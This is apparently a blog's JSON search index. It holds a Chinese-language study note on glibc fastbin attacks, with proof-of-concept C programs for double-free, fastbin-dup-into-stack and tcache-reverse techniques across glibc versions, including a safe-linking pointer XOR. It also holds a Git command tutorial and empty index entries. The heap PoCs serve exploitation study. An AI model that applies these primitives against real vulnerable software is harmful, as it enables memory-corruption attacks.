


[{"content":"\rFast bin attack #\rWhat\u0026rsquo;s fast bin #\rfastbin被存放在fastbinY数组中，该数组一共有10个元素。\n每个fast bin都是一个单链表，只是使用fd指针。fast bin无论是添加还是移除都是对链表尾进行操作，使用后入先出算法，所以fastbinY数组中每个fastbin元素都存放了该链表的尾结点，尾结点通过fd指针指向前一个结点。\nfastbin size：数组中相同的链表存放的chunk大小相同，并且下标相邻的数组元素中的chunk链表的chunk size相差8字节(就是第一个元素chunk size都是16字节，第二个都是24字节，以此类推)，所以默认情况下大小尾16到80字节的chunk会被分到fast chunk中。\nfastbin 合并：不会对freechunk进行合并操作。因为fastchunk本身就是为了快速存取chunk，所以每一个chunk的P位都是设置为1(表示前一个chunk已使用)。但是当释放的chunk与该chunk相邻的空闲chunk合并后大小大于一定的大小时(FASTBIN_CONSOLIDATION_THRESHOLD),内存碎片可能会比较多，我们就需要把fast bin中的chunk都进行合并。\n用户通过malloc请求的大小如果属于fast chunk的大小范围，而这时fast bin支持的最大内存大小以及所有的fast bin链表都是空的(意思就是fast bin里面没有东西)，所以最开始使用malloc申请内存的时候即使申请的内存大小属于fast chunk的内存大小，它也不会交给fast bin处理，而是交给small bin，如果small bin也为空的话就交给unsorted bin。\n当我们第一次调用malloc(fast bin)的时候，系统执行_int_malloc函数，该函数首先会发现当前fast bin为空，就转交给small bin处理，进而又发现small bin 也为空，就调用malloc_consolidate函数对malloc_state结构体进行初始化，malloc_consolidate函数主要完成以下几个功能：\n首先判断当前malloc_state结构体中的fast bin是否为空，如果为空就说明整个malloc_state都没有完成初始化，需要对malloc_state进行初始化。 malloc_state的初始化操作由函数malloc_init_state(av)完成，该函数先初始化除fast bin之外的所有的bins(构建双链表，详情见后文small bins介绍)，再初始化fast bins。 然后当再次执行malloc(fast chunk)函数的时候，此时fast bin相关数据不为空了，就开始使用fast bin。 free(fast chunk)操作：这个操作很简单，主要分为两步：\n先通过chunksize函数根据传入的地址指针获取该指针对应的chunk的大小； 然后根据这个chunk大小获取该chunk所属的fast bin，然后再将此chunk添加到该fast bin的链尾即可。整个操作都是在_int_free函数中完成。得到第一个来自于fast bin的chunk之后，系统就将该chunk从对应的fast bin中移除，并将其地址返回给用户。 fast bin dup #\rglibc2.23 #\rpoc精简 #\r#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;assert.h\u0026gt; int main() { int *a = malloc(8); int *b = malloc(8); int *c = malloc(8); free(a); free(b); free(a); a = malloc(8); b = malloc(8); c = malloc(8); fprintf(stderr, \u0026#34;1st malloc(8): %p\\n\u0026#34;, a); fprintf(stderr, \u0026#34;2nd malloc(8): %p\\n\u0026#34;, b); fprintf(stderr, \u0026#34;3rd malloc(8): %p\\n\u0026#34;, c); assert(a == c); } glibc2.27 - glibc2.39 #\rpoc精简 #\r#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;assert.h\u0026gt; int main() { void *ptrs[8]; for (int i=0; i\u0026lt;8; i++) { ptrs[i] = malloc(8); } for (int i=0; i\u0026lt;7; i++) { free(ptrs[i]); } int *a = calloc(1, 8); int *b = calloc(1, 8); int *c = calloc(1, 8); printf(\u0026#34;1st calloc(1, 8): %p\\n\u0026#34;, a); printf(\u0026#34;2nd calloc(1, 8): %p\\n\u0026#34;, b); printf(\u0026#34;3rd calloc(1, 8): %p\\n\u0026#34;, c); free(a); free(b); free(a); a = calloc(1, 8); b = calloc(1, 8); c = calloc(1, 8); printf(\u0026#34;1st calloc(1, 8): %p\\n\u0026#34;, a); printf(\u0026#34;2nd calloc(1, 8): %p\\n\u0026#34;, b); printf(\u0026#34;3rd calloc(1, 8): %p\\n\u0026#34;, c); assert(a == c); } fastbin dup consolidate #\rPOC精简 #\rglibc 2.23 #\r#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;assert.h\u0026gt; int main() { printf(\u0026#34;This technique will make use of malloc_consolidate and a double free to gain a UAF / duplication of a large-sized chunk\\n\u0026#34;); void* p1 = calloc(1,0x40); printf(\u0026#34;Allocate a fastbin chunk p1=%p \\n\u0026#34;, p1); printf(\u0026#34;Freeing p1 will add it to the fastbin.\\n\\n\u0026#34;); free(p1); void* p3 = malloc(0x400); printf(\u0026#34;a chunk with chunk size 0x410. p3=%p\\n\u0026#34;, p3); assert(p1 == p3); free(p1); // vulnerability void *p4 = malloc(0x400); assert(p4 == p3); printf(\u0026#34;We now have two pointers (p3 and p4) that haven\u0026#39;t been directly freed\\n\u0026#34;); printf(\u0026#34;and both point to the same large-sized chunk. p3=%p p4=%p\\n\u0026#34;, p3, p4); printf(\u0026#34;We have achieved duplication!\\n\\n\u0026#34;); return 0; } glibc 2.27 - glibc 2.39 #\r#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;assert.h\u0026gt; #define CHUNK_SIZE 0x400 int main() { void *ptr[7]; for(int i = 0; i \u0026lt; 7; i++) ptr[i] = malloc(0x40); void* p1 = malloc(0x40); for(int i = 0; i \u0026lt; 7; i++) free(ptr[i]); free(p1); void* p2 = malloc(CHUNK_SIZE); assert(p1 == p2); free(p1); // vulnerability (double free) printf(\u0026#34;It is now in the tcache (or merged with top if we had initially chosen a chunk size \u0026gt; 0x410).\\n\u0026#34;); void *p3 = malloc(CHUNK_SIZE); assert(p3 == p2); printf(\u0026#34;and both point to the same tcache sized chunk. p2=%p p3=%p\\n\u0026#34;, p2, p3); return 0; } fastbin dup into stack #\rPOC精简 #\rglibc 2.23 #\r#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; int main() { unsigned long long stack_var; fprintf(stderr, \u0026#34;The address we want malloc() to return is %p.\\n\u0026#34;, 8+(char *)\u0026amp;stack_var); int *a = malloc(8); int *b = malloc(8); int *c = malloc(8); fprintf(stderr, \u0026#34;1st malloc(8): %p\\n\u0026#34;, a); fprintf(stderr, \u0026#34;2nd malloc(8): %p\\n\u0026#34;, b); fprintf(stderr, \u0026#34;3rd malloc(8): %p\\n\u0026#34;, c); free(a); free(b); free(a); unsigned long long *d = malloc(8); fprintf(stderr, \u0026#34;1st malloc(8): %p\\n\u0026#34;, d); fprintf(stderr, \u0026#34;2nd malloc(8): %p\\n\u0026#34;, malloc(8)); stack_var = 0x20; *d = (unsigned long long) (((char*)\u0026amp;stack_var) - sizeof(d)); fprintf(stderr, \u0026#34;3rd malloc(8): %p, putting the stack address on the free list\\n\u0026#34;, malloc(8)); fprintf(stderr, \u0026#34;4th malloc(8): %p\\n\u0026#34;, malloc(8)); } glibc 2.27 - glibc 2.39 #\r#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;assert.h\u0026gt; int main() { void *ptrs[7]; for (int i=0; i\u0026lt;7; i++) { ptrs[i] = malloc(8); } for (int i=0; i\u0026lt;7; i++) { free(ptrs[i]); } unsigned long long stack_var; int *a = calloc(1,8); int *b = calloc(1,8); int *c = calloc(1,8); fprintf(stderr, \u0026#34;1st calloc(1,8): %p\\n\u0026#34;, a); fprintf(stderr, \u0026#34;2nd calloc(1,8): %p\\n\u0026#34;, b); fprintf(stderr, \u0026#34;3rd calloc(1,8): %p\\n\u0026#34;, c); free(a); free(b); free(a); unsigned long long *d = calloc(1,8); fprintf(stderr, \u0026#34;1st calloc(1,8): %p\\n\u0026#34;, d); fprintf(stderr, \u0026#34;2nd calloc(1,8): %p\\n\u0026#34;, calloc(1,8)); stack_var = 0x20; *d = (unsigned long long) (((char*)\u0026amp;stack_var) - sizeof(d) - 1); //注意对齐 fprintf(stderr, \u0026#34;3rd calloc(1,8): %p, putting the stack address on the free list\\n\u0026#34;, calloc(1,8)); void *p = calloc(1,8); fprintf(stderr, \u0026#34;4th calloc(1,8): %p\\n\u0026#34;, p); // assert((long)__builtin_return_address(0) == *(long *)p); } fastbin_reverse_into_tcache #\r知识点 #\rlibc 2.32以上tache 和fastbin 会有地址加密 程序每当从fastbin/small bin中取出一个堆块，会尝试把该bin中剩余的堆块拿出来去填充tcache。 POC #\rglibc 2.27 - glibc 2.31 #\r#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;assert.h\u0026gt; const size_t allocsize = 0x40; int main(){ setbuf(stdout, NULL); char* ptrs[14]; size_t i; for (i = 0; i \u0026lt; 14; i++) { ptrs[i] = malloc(allocsize); } for (i = 0; i \u0026lt; 7; i++) { free(ptrs[i]); } char* victim = ptrs[7]; free(victim); for (i = 8; i \u0026lt; 14; i++) { free(ptrs[i]); } size_t stack_var[6]; memset(stack_var, 0xcd, sizeof(stack_var)); *(size_t**)victim = \u0026amp;stack_var[0]; // Empty tcache. for (i = 0; i \u0026lt; 7; i++) { ptrs[i] = malloc(allocsize); } for (i = 0; i \u0026lt; 6; i++) { printf(\u0026#34;%p: %p\\n\u0026#34;, \u0026amp;stack_var[i], (char*)stack_var[i]); } malloc(allocsize); for (i = 0; i \u0026lt; 6; i++) { printf(\u0026#34;%p: %p\\n\u0026#34;, \u0026amp;stack_var[i], (char*)stack_var[i]); } char *q = malloc(allocsize); printf( \u0026#34;\\n\u0026#34; \u0026#34;Finally, if we malloc one more time then we get the stack address back: %p\\n\u0026#34;, q ); assert(q == (char *)\u0026amp;stack_var[2]); return 0; } glibc 2.32 - glibc 2.39 #\r#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;assert.h\u0026gt; const size_t allocsize = 0x40; int main(){ setbuf(stdout, NULL); // Allocate 14 times so that we can free later. char* ptrs[14]; size_t i; for (i = 0; i \u0026lt; 14; i++) { ptrs[i] = malloc(allocsize); } // Fill the tcache. for (i = 0; i \u0026lt; 7; i++) free(ptrs[i]); char* victim = ptrs[7]; free(victim); for (i = 8; i \u0026lt; 14; i++) free(ptrs[i]); size_t stack_var[6]; memset(stack_var, 0xcd, sizeof(stack_var)); *(size_t**)victim = (size_t*)((long)\u0026amp;stack_var[0] ^ ((long)victim \u0026gt;\u0026gt; 12)); for (i = 0; i \u0026lt; 7; i++) ptrs[i] = malloc(allocsize); for (i = 0; i \u0026lt; 6; i++) printf(\u0026#34;%p: %p\\n\u0026#34;, \u0026amp;stack_var[i], (char*)stack_var[i]); malloc(allocsize); for (i = 0; i \u0026lt; 6; i++) printf(\u0026#34;%p: %p\\n\u0026#34;, \u0026amp;stack_var[i], (char*)stack_var[i]); char *q = malloc(allocsize); printf(\u0026#34;\\n\u0026#34; \u0026#34;Finally, if we malloc one more time then we get the stack address back: %p\\n\u0026#34;, q); assert(q == (char *)\u0026amp;stack_var[2]); return 0; } ","date":"2025 年 6 月 22 日","externalUrl":null,"permalink":"/posts/pwn/heap/fastbin_attack/","section":"我的博客","summary":"","title":"Fast bin attack","type":"posts"},{"content":"\rGit基础 #\rgit的工作区域和文件状态 #\r工作区域 #\rgraph LR\rA[工作区]--\u003e|git add| B[暂存区]\rB --\u003e|git commit| C[本地仓库]\r工作区：当前项目的文件目录，是开发者直接编辑代码的地方。 暂存区：用于临时存放即将提交的改动。 本地仓库：存储项目完整历史和元数据的数据库（位于 .git 目录中）。 文件状态 #\rgraph LR\rA[未跟踪]--\u003e|git add| B[未修改]\rB --\u003e C[已修改]\rC --\u003e|git add| D[已暂存]\rA --\u003e|git add| D\rD --\u003e|git commit| B\rB --\u003e|git rm| A\rD --\u003e|git reset| C\rC --\u003e|git checkout| B\rUntrack（未跟踪） Unmodified (未修改) Modified (已修改) Staged (已暂存) 基本命令 #\rgit config 配置信息 #\r参数 #\r无 本地仓库有效。\n--global 全局配置，所有仓库生效。\ngit config --global user.name \u0026#34;name\u0026#34; git config --global user.name \u0026#34;exp@qq.com\u0026#34; --system 系统配置，对所有用户生效。\n--list 列出配置信息。\ngit config --system --list git config --global --list git config --list git init 创建仓库 #\rgit init #在当前目录创建 git init my_test #在my_test目录创建 **注意: ** 删除 .git 文件后，就删除了仓库。\ngit status 查看仓库状态 #\r参数 #\r-s 简略查看 git add 添加至暂存区 #\rgit add \u0026lt;file\u0026gt; git add * git commit 提交 #\r参数 #\r-a 同时暂存并提交\n-m 指定提交信息。\ngit commit -m \u0026#34;Message\u0026#34; 无参数 会使用vim 让你在开头输入提交信息。\ngit log 查看历史提交记录 #\r参数 #\r--oneline 查看简洁提交记录。 git ls-files 列出 Git 跟踪的文件 #\r显示 Git 仓库中已跟踪文件的列表，包括已修改、已暂存和已提交的文件。\ngit reset 版本回退 #\r参数 #\r--soft 保留工作区和暂存区。 --hard 不保留工作区和暂存区。 --mixed只保留工作区(默认)。 git reset --soft ID 查看图形化结构 #\rgit log --oneline --graph --decorate --all --hard 误操作回退 #\rgit reflog 查看操作历史记录 #\rgit reflog #查看操作历史记录,找到操作的ID git reset --hard ID # 使用git reset回退 git diff 比较差异 #\r信息格式 #\rdiff --git a/2.txt b/2.txt index 00b30ed..d1019e1 100644 #index 后是文件hash，10644为权限 Binary files a/2.txt and b/2.txt differ 参数 #\r无 比较工作区和暂存区差异\ngit diff HEAD 比较版本库和工作区的差异\ngit diff HEAD --cached 比较暂存区和版本库的差异\ngit diff --cached --staged和--cached 一样\n比较两个版本差异\ngit diff \u0026lt;ID 1\u0026gt; \u0026lt;ID 2\u0026gt; #两个版本比较 git diff \u0026lt;ID\u0026gt; HEAD #和HEAD比较 git diff HEAD HEAD~ #当前版本和上一个版本 git diff HEAD HEAD~2#当前版本和上上个版本 一次类推 比较文件内容\ngit diff HEAD HEAD~ \u0026lt;filename\u0026gt; 比较分支\ngit diff \u0026lt;branch_name\u0026gt; \u0026lt;branch_name\u0026gt; git rm #\r参数 #\r无 同时删除暂存区和工作区\ngit rm \u0026lt;filename\u0026gt; --cached 从暂存区删除，保留工作区\ngit rm --cached \u0026lt;filename\u0026gt; -r 递归删除\ngit rm -r * **注意: ** 删除后记得提交。\n其他删除方法 #\rrm \u0026lt;filename\u0026gt; #先删除工作区 git add \u0026lt;filename\u0026gt; #在删除暂存区 .gitignore 忽略文件 #\r将不被管理的文件名，写入.gitignore文件中，使其不被git管理。\nvim .gitignore #可使用标准Blob模式匹配 --- err.log #忽略err.log 文件 *.txt #忽略所有.txt文件 test/ #忽略test文件夹 /test #忽略test文件夹下的文件，不忽略test 匹配规则 #\r空行和#开头会忽略 可使用标准Blob模式匹配 如：* ? [abc] git clone 拉去文件 #\rgit clone address git push 更新远程仓库 #\rgit push \u0026lt;remote\u0026gt; 参数 #\r-u 添加远程仓库\ngit push \u0026lt;远程仓库名\u0026gt; \u0026lt;分支名\u0026gt; git pull 拉取远程仓库 #\rgit pull \u0026lt;远程仓库名\u0026gt; \u0026lt;远程分支名\u0026gt;:\u0026lt;本地分支名\u0026gt;#相同可省略 git remote #\r参数 #\radd 添加远程仓库\ngit remote add \u0026lt;远程仓库名\u0026gt; \u0026lt;远程仓库地址\u0026gt; -v 查看远程仓库\ngit remote -v rm 删除远程仓库\ngit remote rm origin set-url 重新设置远程厂库\ngit remote set-url origin https://gitee.com/xx/xx.git (新地址) git branch #\r用法 #\r查看分支列表\ngit branch 创建分支\ngit branch \u0026lt;branch-name\u0026gt; 删除分支\ngit branch -d \u0026lt;branch-name\u0026gt; #删除已合并 git branch -D \u0026lt;branch-name\u0026gt; #删除未合并 git switch 切换分支 #\rgit switch \u0026lt;branch-name\u0026gt; git merge #\r用法 #\r合并分支\ngit merge \u0026lt;branch-name\u0026gt; ​\t注意：git merge合并分支必须在\n终止合并\ngit merge --abort 分支合并冲突处理 #\r手动修改冲突文件，合并冲突内容 然后将该文件添加至暂存区 提交修改 不想继续合并可以使用终止合并的命令。\n优缺点 #\r优点： 不会破坏分支的提交历史，方便回溯和查看。\n缺点：会产生额外的提交节点，分支图比较复杂。.\ngit rebase #\r优缺点 #\r**优点：**不会新增额外提交记录，形成线性历史，比较直观\n**缺点：**会改变提交历史，改变当前分支branch out的节点，比卖在共享分支使用。\nGit 工作流模型 #\rGitFlow #\rGitHubFlow #\r","date":"2025 年 6 月 22 日","externalUrl":null,"permalink":"/posts/git/git%E5%9F%BA%E7%A1%80/","section":"我的博客","summary":"","title":"Git","type":"posts"},{"content":"","date":"2025 年 6 月 21 日","externalUrl":null,"permalink":"/posts/git/","section":"我的博客","summary":"","title":"Git","type":"posts"},{"content":"","date":"2025 年 6 月 21 日","externalUrl":null,"permalink":"/posts/pwn/heap/","section":"我的博客","summary":"","title":"Heap","type":"posts"},{"content":"","date":"2025 年 6 月 21 日","externalUrl":null,"permalink":"/posts/pwn/","section":"我的博客","summary":"","title":"PWN","type":"posts"},{"content":"","date":"2025 年 6 月 21 日","externalUrl":null,"permalink":"/posts/python/","section":"我的博客","summary":"","title":"Python","type":"posts"},{"content":"","date":"2025 年 6 月 21 日","externalUrl":null,"permalink":"/posts/web/","section":"我的博客","summary":"","title":"Web","type":"posts"},{"content":"","date":"2025 年 6 月 21 日","externalUrl":null,"permalink":"/posts/","section":"我的博客","summary":"","title":"我的博客","type":"posts"},{"content":"","externalUrl":null,"permalink":"/en/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/en/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","externalUrl":null,"permalink":"/en/series/","section":"Series","summary":"","title":"Series","type":"series"},{"content":"","externalUrl":null,"permalink":"/en/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":"","externalUrl":null,"permalink":"/en/","section":"Tea","summary":"","title":"Tea","type":"page"}]